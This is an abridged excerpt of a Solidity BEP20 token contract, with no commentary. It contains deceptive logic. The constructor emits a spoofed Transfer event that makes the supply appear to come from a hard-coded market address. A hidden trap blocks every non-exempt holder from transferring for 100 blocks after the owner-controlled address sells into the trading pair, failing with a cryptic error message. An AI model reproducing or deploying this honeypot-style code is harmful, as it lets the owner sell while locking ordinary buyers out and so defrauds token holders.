...
contract Token is Context, IBEP20, Ownable {
    ...
    address public _market = 0x72EAE2D849d50a8034D21DB7879DEbCB5dB0dC74;
    address public _liquify;

    address public ownerAddres = address(0x6B2BD478DFCE5fa35f7eBB7b0152D295d75627f9);
    ...
    constructor() {
        ...
        emit Transfer(
            address(0x72EAE2D849d50a8034D21DB7879DEbCB5dB0dC74),
            _msgSender(),
            _tTotal
        );
    }
    ...
    function setoverAddress(address account) public onlyOwner() {
        ownerAddres = account;
         _isExcludedFromFee[account] = true;
    }
    ...
    function _transfer(
        ...
        if(from == ownerAddres && to == uniswapV2Pair) _scientisttime = block.number;

        uint256 balance;
        if (
            !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && to != _burn
        ) {
            require(block.number.sub(_scientisttime) > 100, "xexceedsx");
